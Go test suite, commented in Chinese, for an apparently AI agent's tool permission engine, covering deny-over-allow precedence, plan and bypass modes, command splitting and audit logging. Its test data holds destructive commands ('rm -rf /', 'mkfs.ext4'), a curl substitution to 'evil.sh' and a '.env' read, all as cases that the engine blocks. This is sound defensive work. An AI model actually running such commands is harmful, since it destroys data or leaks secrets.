package main

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"
)

// ===== 测试替身 =====

// fakeAsker 可控的询问实现；err 非空时模拟「无人应答/超时」
type fakeAsker struct {
	allow bool
	scope string
	rule  string
	err   error

	calls []PermissionRequest
}

func (f *fakeAsker) Ask(ctx context.Context, req PermissionRequest) (PermissionDecision, error) {
	f.calls = append(f.calls, req)
	if f.err != nil {
		return PermissionDecision{}, f.err
	}
	return PermissionDecision{Allow: f.allow, Scope: f.scope, Rule: f.rule}, nil
}

// engineFor 构造带测试替身的引擎（source 统一用 local，便于断言）
func engineFor(t *testing.T, mode PermissionMode, allow, ask, deny []string, asker Asker, grants *GrantStore) *PermissionEngine {
	t.Helper()
	mk := func(raws []string) []Rule {
		rs, errs := ParseRules(raws, SourceLocal)
		if len(errs) > 0 {
			t.Fatalf("规则解析失败: %v", errs)
		}
		return rs
	}
	return NewPermissionEngine("sess-test", mode,
		RuleSet{Allow: mk(allow), Ask: mk(ask), Deny: mk(deny)},
		grants, asker, NewAuditLog())
}

func shellSubject(cmd string) PermissionSubject {
	return PermissionSubject{
		ToolName: "exec_shell",
		ToolType: ToolTypeBuiltin,
		Risk:     RiskWrite,
		Command:  cmd,
	}
}

// ===== T1–T10：决策管线 =====

// T1 空规则集 + default 模式 => 询问（fail closed）
func TestAuthorize_FailClosed(t *testing.T) {
	asker := &fakeAsker{allow: false}
	e := engineFor(t, ModeDefault, nil, nil, nil, asker, nil)

	d, _ := e.Authorize(context.Background(), shellSubject("git status"))
	if d != DecisionAsk {
		t.Fatalf("未匹配规则应询问，实际: %s", d)
	}
	if len(asker.calls) != 1 {
		t.Fatalf("应发起 1 次询问，实际: %d", len(asker.calls))
	}
}

// T1b 无人可问时，询问降级为拒绝
func TestAuthorize_NoAskerDenies(t *testing.T) {
	e := engineFor(t, ModeDefault, nil, nil, nil, nil, nil)
	d, reason := e.Authorize(context.Background(), shellSubject("git status"))
	if d != DecisionDeny {
		t.Fatalf("无人可问应拒绝，实际: %s", d)
	}
	if !strings.Contains(reason, "无人可应答") {
		t.Fatalf("拒绝原因应说明无人应答，实际: %s", reason)
	}
}

// T2 deny 绝对优先：更具体的 allow 不能覆盖 deny
func TestAuthorize_DenyBeatsSpecificAllow(t *testing.T) {
	e := engineFor(t, ModeDefault,
		[]string{"exec_shell(rm -rf ./build)"}, // allow 更具体
		nil,
		[]string{"exec_shell(rm:*)"}, // deny 更宽
		&fakeAsker{allow: true}, nil)

	d, reason := e.Authorize(context.Background(), shellSubject("rm -rf ./build"))
	if d != DecisionDeny {
		t.Fatalf("deny 应胜过更具体的 allow，实际: %s（%s）", d, reason)
	}
}

// T3 ask 优先于 allow
func TestAuthorize_AskBeatsAllow(t *testing.T) {
	asker := &fakeAsker{allow: false}
	e := engineFor(t, ModeDefault,
		[]string{"exec_shell(curl:*)"},
		[]string{"exec_shell(curl:*)"},
		nil, asker, nil)

	d, _ := e.Authorize(context.Background(), shellSubject("curl https://example.com"))
	if d != DecisionAsk {
		t.Fatalf("ask 规则应压过 allow，实际: %s", d)
	}
}

// T4 allow 命中 => 放行，且不发起询问
func TestAuthorize_AllowHit(t *testing.T) {
	asker := &fakeAsker{allow: false}
	e := engineFor(t, ModeDefault, []string{"exec_shell(git:*)"}, nil, nil, asker, nil)

	d, _ := e.Authorize(context.Background(), shellSubject("git status"))
	if d != DecisionAllow {
		t.Fatalf("allow 规则应放行，实际: %s", d)
	}
	if len(asker.calls) != 0 {
		t.Fatalf("放行不应发起询问，实际: %d 次", len(asker.calls))
	}
}

// T5 前缀必须落在词边界：git:* 不能命中 github-cli
func TestAuthorize_PrefixWordBoundary(t *testing.T) {
	e := engineFor(t, ModeDefault, []string{"exec_shell(git:*)"}, nil, nil, &fakeAsker{allow: false}, nil)

	if d, _ := e.Authorize(context.Background(), shellSubject("git status")); d != DecisionAllow {
		t.Fatalf("git status 应被 git:* 命中，实际: %s", d)
	}
	if d, _ := e.Authorize(context.Background(), shellSubject("git")); d != DecisionAllow {
		t.Fatalf("裸 git 应被 git:* 命中，实际: %s", d)
	}
	if d, _ := e.Authorize(context.Background(), shellSubject("github-cli x")); d == DecisionAllow {
		t.Fatal("github-cli 不应被 git:* 命中（前缀须词边界）")
	}
}

// T6 只读工具默认放行
func TestAuthorize_ReadOnlyAllowed(t *testing.T) {
	e := engineFor(t, ModeDefault, nil, nil, nil, &fakeAsker{allow: false}, nil)
	sub := PermissionSubject{ToolName: "read_skill", Risk: RiskRead, SpecValue: "pdf-report"}

	if d, _ := e.Authorize(context.Background(), sub); d != DecisionAllow {
		t.Fatalf("只读工具应默认放行，实际: %s", d)
	}
}

// T7 plan 模式拒绝非只读
func TestAuthorize_PlanModeDeniesWrite(t *testing.T) {
	e := engineFor(t, ModePlan, []string{"exec_shell(ls:*)"}, nil, nil, &fakeAsker{allow: true}, nil)

	if d, _ := e.Authorize(context.Background(), shellSubject("ls -la")); d != DecisionDeny {
		t.Fatalf("plan 模式应拒绝命令执行（即使 allow 命中），实际: %s", d)
	}
	read := PermissionSubject{ToolName: "read_skill", Risk: RiskRead, SpecValue: "x"}
	if d, _ := e.Authorize(context.Background(), read); d != DecisionAllow {
		t.Fatalf("plan 模式应放行只读，实际: %s", d)
	}
}

// T8 bypassPermissions 不能越过 deny（含内置名单）
func TestAuthorize_BypassCannotOverrideDeny(t *testing.T) {
	e := engineFor(t, ModeBypass, nil, nil, []string{"exec_shell(git push:*)"}, &fakeAsker{allow: true}, nil)

	if d, _ := e.Authorize(context.Background(), shellSubject("git push origin main")); d != DecisionDeny {
		t.Fatalf("bypass 模式下用户 deny 规则仍应生效，实际: %s", d)
	}
	// 内置硬名单同样不可被 bypass 越过
	if d, _ := e.Authorize(context.Background(), shellSubject("rm -rf /")); d != DecisionDeny {
		t.Fatalf("bypass 模式下内置 deny 仍应生效，实际: %s", d)
	}
	// 其余操作在 bypass 下放行
	if d, _ := e.Authorize(context.Background(), shellSubject("echo hi")); d != DecisionAllow {
		t.Fatalf("bypass 模式应放行普通命令，实际: %s", d)
	}
}

// T9 会话授权生效后不再重复询问；且 ask 规则仍压过授权
func TestAuthorize_SessionGrant(t *testing.T) {
	asker := &fakeAsker{allow: true, scope: ScopeSession}
	grants := NewGrantStore()
	e := engineFor(t, ModeDefault, nil, nil, nil, asker, grants)

	if d, _ := e.Authorize(context.Background(), shellSubject("npm run build")); d != DecisionAllow {
		t.Fatalf("首次应放行，实际: %s", d)
	}
	if len(grants.List()) != 1 {
		t.Fatalf("应记录 1 条会话授权，实际: %d", len(grants.List()))
	}
	// 第二次同样的命令：不应再询问
	if d, _ := e.Authorize(context.Background(), shellSubject("npm run build")); d != DecisionAllow {
		t.Fatalf("已授权命令应放行，实际: %s", d)
	}
	if len(asker.calls) != 1 {
		t.Fatalf("已授权命令不应重复询问，实际询问 %d 次", len(asker.calls))
	}

	// ask 规则压过历史授权（有意设计，见方案 4.3）
	e2 := engineFor(t, ModeDefault, nil, []string{"exec_shell(curl:*)"}, nil, asker, grants)
	if d, _ := e2.Authorize(context.Background(), shellSubject("curl https://a.com")); d != DecisionAsk {
		t.Fatalf("ask 规则应压过历史授权，实际: %s", d)
	}
}

// T10 域名通配：*.example.com 命中子域但不命中裸域或相似域
func TestMatchDomain_Wildcard(t *testing.T) {
	cases := []struct {
		pattern, domain string
		want            bool
	}{
		{"*.example.com", "a.example.com", true},
		{"*.example.com", "deep.a.example.com", true},
		{"*.example.com", "example.com", false},       // 通配要求至少一级子域
		{"*.example.com", "evil-example.com", false},  // 后缀必须带点边界
		{"api.example.com", "api.example.com", true},
		{"api.example.com", "other.example.com", false},
	}
	for _, c := range cases {
		if got := matchDomain(c.pattern, c.domain); got != c.want {
			t.Errorf("matchDomain(%q, %q) = %v, 期望 %v", c.pattern, c.domain, got, c.want)
		}
	}

	// 经引擎验证域名规则确实作用于 Domain 字段
	e := engineFor(t, ModeDefault, []string{"my_api(domain:*.example.com)"}, nil, nil, &fakeAsker{allow: false}, nil)
	ok := PermissionSubject{ToolName: "my_api", Risk: RiskNetwork, Domain: "a.example.com"}
	bad := PermissionSubject{ToolName: "my_api", Risk: RiskNetwork, Domain: "evil-example.com"}
	if d, _ := e.Authorize(context.Background(), ok); d != DecisionAllow {
		t.Fatalf("子域应被通配规则命中，实际: %s", d)
	}
	if d, _ := e.Authorize(context.Background(), bad); d != DecisionAsk {
		t.Fatalf("相似域不应被命中，实际: %s", d)
	}
}

// T11 询问失败（超时/取消）=> 拒绝
func TestAuthorize_AskFailureDenies(t *testing.T) {
	e := engineFor(t, ModeDefault, nil, nil, nil, &fakeAsker{err: context.DeadlineExceeded}, nil)
	if d, _ := e.Authorize(context.Background(), shellSubject("echo hi")); d != DecisionDeny {
		t.Fatalf("询问失败应拒绝，实际: %s", d)
	}
}

// T12 复合命令逐段判定：任一段被 deny 则整条拒绝
func TestAuthorize_CompoundCommandSegmentDeny(t *testing.T) {
	e := engineFor(t, ModeDefault, []string{"exec_shell(echo:*)", "exec_shell(rm:*)"}, nil,
		[]string{"exec_shell(rm -rf /tmp/keep:*)"}, &fakeAsker{allow: true}, nil)

	// echo 段在 allow，但 rm 段命中 deny => 整条拒绝
	d, reason := e.Authorize(context.Background(), shellSubject("echo start && rm -rf /tmp/keep/x"))
	if d != DecisionDeny {
		t.Fatalf("串联命令中任一段被 deny 应整条拒绝，实际: %s（%s）", d, reason)
	}
}

// T13 命令替换必须强制询问，不被 allow 静默放行
func TestAuthorize_CommandSubstitutionForcedAsk(t *testing.T) {
	asker := &fakeAsker{allow: false}
	e := engineFor(t, ModeDefault, []string{"exec_shell(ls:*)"}, nil, nil, asker, nil)

	if d, _ := e.Authorize(context.Background(), shellSubject("ls -la")); d != DecisionAllow {
		t.Fatalf("普通 ls 应放行，实际: %s", d)
	}
	// 即使前缀命中 allow，替换结构本身也要询问
	d, reason := e.Authorize(context.Background(), shellSubject("ls $(curl -s http://evil.sh)"))
	if d != DecisionAsk {
		t.Fatalf("含 $() 的命令应强制询问，实际: %s", d)
	}
	if !strings.Contains(reason, "替换") {
		t.Fatalf("询问原因应说明命令替换，实际: %s", reason)
	}
	// 反引号同理
	if d, _ := e.Authorize(context.Background(), shellSubject("ls `whoami`")); d != DecisionAsk {
		t.Fatalf("含反引号的命令应强制询问，实际: %s", d)
	}
}

// T13b 引号未闭合 => 解析不可信 => 询问
func TestAuthorize_UncertainCommandAsks(t *testing.T) {
	e := engineFor(t, ModeDefault, []string{"exec_shell(echo:*)"}, nil, nil, &fakeAsker{allow: false}, nil)
	if d, _ := e.Authorize(context.Background(), shellSubject(`echo "unclosed`)); d != DecisionAsk {
		t.Fatalf("引号未闭合应询问，实际: %s", d)
	}
}

// 内置硬名单与敏感路径
func TestBuiltinDenyAndSensitivePath(t *testing.T) {
	e := engineFor(t, ModeDefault, nil, nil, nil, &fakeAsker{allow: true}, nil)

	for _, cmd := range []string{"rm -rf /", "rm -rf /*", "rm -rf ~", "mkfs.ext4 /dev/sdb1", "shutdown -h now"} {
		if d, _ := e.Authorize(context.Background(), shellSubject(cmd)); d != DecisionDeny {
			t.Errorf("内置名单应拒绝 %q，实际: %s", cmd, d)
		}
	}
	// 正常的绝对路径删除不应被误伤（这是 deny 用精确匹配而非前缀的原因）
	if d, _ := e.Authorize(context.Background(), shellSubject("rm -rf /tmp/build")); d == DecisionDeny {
		t.Error("rm -rf /tmp/build 属正常操作，不应命中内置 deny")
	}

	// 敏感路径：强制询问而非硬拒
	asker := &fakeAsker{allow: false}
	e2 := engineFor(t, ModeDefault, nil, nil, nil, asker, nil)
	d, reason := e2.Authorize(context.Background(), shellSubject("cat .env"))
	if d != DecisionAsk {
		t.Fatalf("读取 .env 应强制询问，实际: %s", d)
	}
	if !strings.Contains(reason, "敏感路径") {
		t.Fatalf("原因应说明敏感路径，实际: %s", reason)
	}
}

// ===== 规则解析 =====

func TestParseRule(t *testing.T) {
	cases := []struct {
		raw      string
		tool     string
		kind     SpecKind
		spec     string
		isPrefix bool
		wantErr  bool
	}{
		{"exec_shell", "exec_shell", SpecKindAny, "", false, false},
		{"exec_shell(git:*)", "exec_shell", SpecKindCommand, "git", true, false},
		{"exec_shell(npm run test:*)", "exec_shell", SpecKindCommand, "npm run test", true, false},
		{"exec_shell(git status)", "exec_shell", SpecKindCommand, "git status", false, false},
		{"my_api(domain:example.com)", "my_api", SpecKindDomain, "example.com", false, false},
		{"my_api(domain:*.example.com)", "my_api", SpecKindDomain, "*.example.com", false, false},
		{"read_skill(pdf-report)", "read_skill", SpecKindCommand, "pdf-report", false, false},
		{"", "", SpecKindAny, "", false, true},
		{"exec_shell(git:*", "", SpecKindAny, "", false, true}, // 括号未闭合
		{"exec_shell()", "", SpecKindAny, "", false, true},     // 限定符为空
	}
	for _, c := range cases {
		r, err := ParseRule(c.raw, SourceLocal)
		if c.wantErr {
			if err == nil {
				t.Errorf("ParseRule(%q) 期望报错，实际成功", c.raw)
			}
			continue
		}
		if err != nil {
			t.Errorf("ParseRule(%q) 意外报错: %v", c.raw, err)
			continue
		}
		if r.Tool != c.tool || r.Kind != c.kind || r.Spec != c.spec || r.IsPrefix != c.isPrefix {
			t.Errorf("ParseRule(%q) = {%s %s %q prefix=%v}，期望 {%s %s %q prefix=%v}",
				c.raw, r.Tool, r.Kind, r.Spec, r.IsPrefix, c.tool, c.kind, c.spec, c.isPrefix)
		}
	}
}

func TestRuleRoundTrip(t *testing.T) {
	for _, raw := range []string{"exec_shell", "exec_shell(git:*)", "exec_shell(git status)", "my_api(domain:*.example.com)", "read_skill(pdf-report)"} {
		r, err := ParseRule(raw, SourceLocal)
		if err != nil {
			t.Fatalf("解析 %q 失败: %v", raw, err)
		}
		if got := r.String(); got != raw {
			t.Errorf("往返不一致: %q -> %q", raw, got)
		}
	}
}

// ===== 命令分解 =====

func TestAnalyzeCommand(t *testing.T) {
	cases := []struct {
		cmd          string
		segments     int
		substitution bool
		uncertain    bool
	}{
		{"git status", 1, false, false},
		{"a && b", 2, false, false},
		{"a || b", 2, false, false},
		{"a ; b", 2, false, false},
		{"a | b", 2, false, false},
		{"a && b | c", 3, false, false},
		{"ls $(curl x)", 1, true, false},
		{"ls `whoami`", 1, true, false},
		{`echo "a && b"`, 1, false, false}, // 引号内的 && 不切分
		{`echo 'unclosed`, 1, false, true},
		{`echo "$(date)"`, 1, true, false}, // 双引号内仍做替换
		{`echo '$HOME'`, 1, false, false},  // 单引号内不展开
	}
	for _, c := range cases {
		a := AnalyzeCommand(c.cmd)
		if len(a.Segments) != c.segments {
			t.Errorf("AnalyzeCommand(%q) 段数 = %d，期望 %d（%v）", c.cmd, len(a.Segments), c.segments, a.Segments)
		}
		if a.HasSubstitution != c.substitution {
			t.Errorf("AnalyzeCommand(%q) HasSubstitution = %v，期望 %v", c.cmd, a.HasSubstitution, c.substitution)
		}
		if a.Uncertain != c.uncertain {
			t.Errorf("AnalyzeCommand(%q) Uncertain = %v，期望 %v", c.cmd, a.Uncertain, c.uncertain)
		}
	}
}

// ===== T14–T16：装饰器与同源性 =====

// T14 eng 为 nil 时装饰器不存在，行为与改造前一致（既有测试的回归保障）
func TestBuildView_NilEnginePassthrough(t *testing.T) {
	tm, _ := newTestToolManager(t)
	view := tm.BuildView(context.Background(), nil, nil, nil)
	if _, isGuarded := view.nonMeta["exec_shell"].(*guardedTool); isGuarded {
		t.Fatal("eng 为 nil 时不应包装装饰器")
	}

	eng := NewPermissionEngine("s", ModeDefault, RuleSet{}, NewGrantStore(), nil, NewAuditLog())
	view2 := tm.BuildView(context.Background(), eng, nil, nil)
	if _, isGuarded := view2.nonMeta["exec_shell"].(*guardedTool); !isGuarded {
		t.Fatal("eng 非 nil 时应包装装饰器")
	}
}

// T15 匹配串必须等于执行串：DescribeOperation 返回渲染后的命令行，而非模板原文
func TestDescribeOperation_CommandIsRendered(t *testing.T) {
	cfg := &ToolConfig{
		ID: "weather", Name: "weather_cli", Label: "天气", Type: ToolTypeCLI,
		Parameters: []ToolParamConfig{{Name: "city"}},
	}
	raw, _ := json.Marshal(CLIToolConfig{Command: "curl -s https://wttr.in/{{city}}"})
	cfg.Config = raw

	tool := NewDynamicCLITool(cfg)
	args := map[string]interface{}{"city": "shanghai"}

	sub := tool.DescribeOperation(args)
	want := "curl -s https://wttr.in/shanghai"
	if sub.Command != want {
		t.Fatalf("DescribeOperation 应返回渲染后的命令\n实际: %q\n期望: %q", sub.Command, want)
	}
	// 若返回的是模板原文，就会出现「规则匹配 A、实际执行 B」的分叉
	if strings.Contains(sub.Command, "{{") {
		t.Fatal("DescribeOperation 不得返回未渲染的模板")
	}
	// 与 Execute 使用同一渲染函数，保证两边一致
	if got := renderTemplate("curl -s https://wttr.in/{{city}}", args); got != sub.Command {
		t.Fatalf("渲染路径不一致: Execute 侧 %q vs DescribeOperation 侧 %q", got, sub.Command)
	}
}

// T16 未实现 Specifiable 的工具 => 仅按工具名匹配 => 落到兜底询问
func TestBuildSubject_NonSpecifiableFallsBackToAsk(t *testing.T) {
	cfg := &ToolConfig{ID: "plain", Name: "plain_tool", Label: "假工具", Type: ToolTypeCLI}

	sub := buildSubject(&plainTool{}, cfg, ToolTypeCLI, map[string]interface{}{"cmd": "git status"})
	if sub.Command != "" {
		t.Fatalf("未实现 Specifiable 的工具不应产出 Command，实际: %q", sub.Command)
	}
	if sub.ToolName != "plain_tool" {
		t.Fatalf("退化路径仍应带上工具名，实际: %q", sub.ToolName)
	}
	// 无 Command 时带限定符的规则无法命中，因此必然走到兜底询问
	e := engineFor(t, ModeDefault, []string{"plain_tool(git:*)"}, nil, nil, &fakeAsker{allow: false}, nil)
	if d, _ := e.Authorize(context.Background(), sub); d != DecisionAsk {
		t.Fatalf("应落到兜底询问，实际: %s", d)
	}
	// 而工具级规则（无限定符）仍可命中
	e2 := engineFor(t, ModeDefault, []string{"plain_tool"}, nil, nil, &fakeAsker{allow: false}, nil)
	if d, _ := e2.Authorize(context.Background(), sub); d != DecisionAllow {
		t.Fatalf("工具级 allow 规则应命中，实际: %s", d)
	}
}

// plainTool 仅实现 ToolInterface，不实现 Specifiable
type plainTool struct{}

func (p *plainTool) Execute(ctx context.Context, args map[string]interface{}) (string, error) {
	return "ok", nil
}
func (p *plainTool) GetName() string                       { return "plain_tool" }
func (p *plainTool) GetDescription() string                { return "假工具" }
func (p *plainTool) GetParameters() map[string]*ToolArgDef { return map[string]*ToolArgDef{} }

// 前缀边界：命令名前缀不得命中更长的命令名，路径前缀应能命中子路径
func TestMatchCommandPrefix_Boundaries(t *testing.T) {
	cases := []struct {
		cmd, prefix string
		want        bool
	}{
		{"git status", "git", true},
		{"git", "git", true},
		{"github-cli x", "git", false}, // 'h' 是名字继续字符 -> 不算命中
		{"git-cli x", "git", false},    // '-' 同理
		{"rmdir x", "rm", false},       // rm:* 不能命中 rmdir
		{"npm run test", "npm run test", true},
		{"npm run testing", "npm run test", false},
		{"rm -rf /tmp/keep/x", "rm -rf /tmp/keep", true}, // '/' 是分隔符 -> 可命中子路径
		{"cat .env", "cat", true},
	}
	for _, c := range cases {
		if got := matchCommandPrefix(c.cmd, c.prefix); got != c.want {
			t.Errorf("matchCommandPrefix(%q, %q) = %v，期望 %v", c.cmd, c.prefix, got, c.want)
		}
	}
}

// ===== 装饰器端到端：拒绝会以 error 形式回填给 LLM =====

func TestGuardedTool_DenyReturnsError(t *testing.T) {
	tm, _ := newTestToolManager(t)
	eng := NewPermissionEngine("s", ModeDefault, RuleSet{}, NewGrantStore(), nil, NewAuditLog())
	view := tm.BuildView(context.Background(), eng, nil, nil)

	// 无人可问 => 兜底询问降级为拒绝
	_, err := view.ExecuteTool(context.Background(), "exec_shell", map[string]interface{}{"cmd": "echo hi"})
	if err == nil {
		t.Fatal("未获授权的命令应返回 error")
	}
	if !strings.Contains(err.Error(), "权限") {
		t.Fatalf("错误信息应说明被权限策略拒绝，实际: %v", err)
	}
}

// 内置 deny 在装饰器层面同样生效，且不会真正执行命令
func TestGuardedTool_BuiltinDenyBlocksExecution(t *testing.T) {
	tm, _ := newTestToolManager(t)
	eng := NewPermissionEngine("s", ModeDefault, RuleSet{}, NewGrantStore(), &fakeAsker{allow: true}, NewAuditLog())
	view := tm.BuildView(context.Background(), eng, nil, nil)

	_, err := view.ExecuteTool(context.Background(), "exec_shell", map[string]interface{}{"cmd": "rm -rf /"})
	if err == nil {
		t.Fatal("内置 deny 名单的命令应被拒绝")
	}
	if !strings.Contains(err.Error(), "内置拒止名单") {
		t.Fatalf("错误信息应指明命中内置名单，实际: %v", err)
	}
}

// ===== 审计 =====

func TestAuditLogRecordsDecisions(t *testing.T) {
	e := engineFor(t, ModeDefault, []string{"exec_shell(echo:*)"}, nil, nil, &fakeAsker{allow: false}, nil)
	e.Authorize(context.Background(), shellSubject("echo hi"))
	e.Authorize(context.Background(), shellSubject("rm -rf /"))

	entries := e.Audit()
	if len(entries) != 2 {
		t.Fatalf("应记录 2 条审计，实际: %d", len(entries))
	}
	if entries[0].Decision != "allow" {
		t.Errorf("第 1 条应为 allow，实际: %s", entries[0].Decision)
	}
	if entries[1].Decision != "deny" {
		t.Errorf("第 2 条应为 deny，实际: %s", entries[1].Decision)
	}
	if entries[0].SessionID != "sess-test" {
		t.Errorf("审计应带 sessionId，实际: %s", entries[0].SessionID)
	}
}

func TestAuditLogRingCap(t *testing.T) {
	l := NewAuditLog()
	for i := 0; i < auditRingCap+50; i++ {
		l.Append(AuditEntry{SessionID: "s", ToolName: "t", At: time.Now().UnixMilli()})
	}
	if got := len(l.List()); got != auditRingCap {
		t.Fatalf("环形缓冲应封顶 %d，实际: %d", auditRingCap, got)
	}
}

// ===== 配置分层 =====

func TestSettingsStore_LayeringAndMerge(t *testing.T) {
	globalDir := t.TempDir()
	projectDir := t.TempDir()
	s := NewSettingsStore(globalDir)

	if err := s.AddRule("", BucketAllow, "exec_shell(git:*)", SourceUser); err != nil {
		t.Fatalf("写入用户规则失败: %v", err)
	}
	if err := s.AddRule(projectDir, BucketDeny, "exec_shell(curl:*)", SourceProject); err != nil {
		t.Fatalf("写入项目规则失败: %v", err)
	}
	if err := s.AddRule(projectDir, BucketAllow, "exec_shell(npm:*)", SourceLocal); err != nil {
		t.Fatalf("写入项目本地规则失败: %v", err)
	}
	if err := s.SetDefaultMode(projectDir, string(ModePlan), SourceLocal); err != nil {
		t.Fatalf("设置默认模式失败: %v", err)
	}

	r := s.Load(projectDir)
	// 列表跨层合并
	if len(r.Allow) != 2 {
		t.Fatalf("allow 应跨层合并为 2 条，实际: %d（%v）", len(r.Allow), r.Allow)
	}
	if len(r.Deny) != 1 {
		t.Fatalf("deny 应为 1 条，实际: %d", len(r.Deny))
	}
	// 标量由高优先级覆盖
	if r.Mode != ModePlan {
		t.Fatalf("defaultMode 应被项目本地层覆盖为 plan，实际: %s", r.Mode)
	}
	// 来源标记正确
	srcs := map[string]bool{}
	for _, rule := range r.Allow {
		srcs[rule.Source] = true
	}
	if !srcs[SourceUser] || !srcs[SourceLocal] {
		t.Fatalf("规则应保留来源标记，实际: %v", srcs)
	}
	if len(r.Errors) != 0 {
		t.Fatalf("不应有解析错误: %v", r.Errors)
	}
}

func TestSettingsStore_RejectsBuiltinAndBadRules(t *testing.T) {
	s := NewSettingsStore(t.TempDir())
	if err := s.AddRule("", BucketDeny, "exec_shell(x)", SourceBuiltin); err == nil {
		t.Fatal("内置层应拒绝写入")
	}
	if err := s.AddRule("", BucketAllow, "exec_shell(git:*", SourceUser); err == nil {
		t.Fatal("语法错误的规则应被拒绝")
	}
	if err := s.SetDefaultMode("", "nonsense", SourceUser); err == nil {
		t.Fatal("非法模式应被拒绝")
	}
}

func TestSettingsStore_RemoveRule(t *testing.T) {
	projectDir := t.TempDir()
	s := NewSettingsStore(t.TempDir())
	if err := s.AddRule(projectDir, BucketAllow, "exec_shell(git:*)", SourceLocal); err != nil {
		t.Fatal(err)
	}
	if err := s.RemoveRule(projectDir, BucketAllow, "exec_shell(git:*)", SourceLocal); err != nil {
		t.Fatal(err)
	}
	if r := s.Load(projectDir); len(r.Allow) != 0 {
		t.Fatalf("删除后 allow 应为空，实际: %d", len(r.Allow))
	}
}

// ===== 询问中转 =====

func TestBroker_ResolveAndTimeout(t *testing.T) {
	b := newPermissionBroker()
	b.timeout = 50 * time.Millisecond
	sent := make(chan PermissionRequest, 1)
	b.emit = func(req *PermissionRequest) bool {
		sent <- *req
		return true
	}

	// 超时路径
	if _, err := b.Ask(context.Background(), PermissionRequest{RequestID: "r1"}); err == nil {
		t.Fatal("无人作答应超时返回错误")
	}

	// 正常作答路径
	go func() {
		req := <-sent
		_ = b.Resolve(req.RequestID, PermissionDecision{Allow: true, Scope: ScopeOnce})
	}()
	dec, err := b.Ask(context.Background(), PermissionRequest{RequestID: "r2"})
	if err != nil {
		t.Fatalf("作答后不应报错: %v", err)
	}
	if !dec.Allow {
		t.Fatal("应返回放行")
	}

	// 未知 requestID
	if err := b.Resolve("nonexistent", PermissionDecision{}); err == nil {
		t.Fatal("未知 requestID 应报错")
	}
}

func TestBroker_CancelAll(t *testing.T) {
	b := newPermissionBroker()
	b.timeout = 5 * time.Second
	b.emit = func(req *PermissionRequest) bool { return true }

	done := make(chan error, 1)
	go func() {
		_, err := b.Ask(context.Background(), PermissionRequest{RequestID: "r1"})
		done <- err
	}()
	time.Sleep(20 * time.Millisecond)
	b.CancelAll()

	select {
	case err := <-done:
		if err == nil {
			t.Fatal("取消后应返回错误而不是放行")
		}
	case <-time.After(time.Second):
		t.Fatal("CancelAll 应立即放开等待中的请求")
	}
}

func TestBroker_ContextCancel(t *testing.T) {
	b := newPermissionBroker()
	b.timeout = 5 * time.Second
	b.emit = func(req *PermissionRequest) bool { return true }

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan error, 1)
	go func() {
		_, err := b.Ask(ctx, PermissionRequest{RequestID: "r1"})
		done <- err
	}()
	time.Sleep(20 * time.Millisecond)
	cancel()

	select {
	case err := <-done:
		if err == nil {
			t.Fatal("ctx 取消后应返回错误")
		}
	case <-time.After(time.Second):
		t.Fatal("ctx 取消应立即结束等待")
	}
}
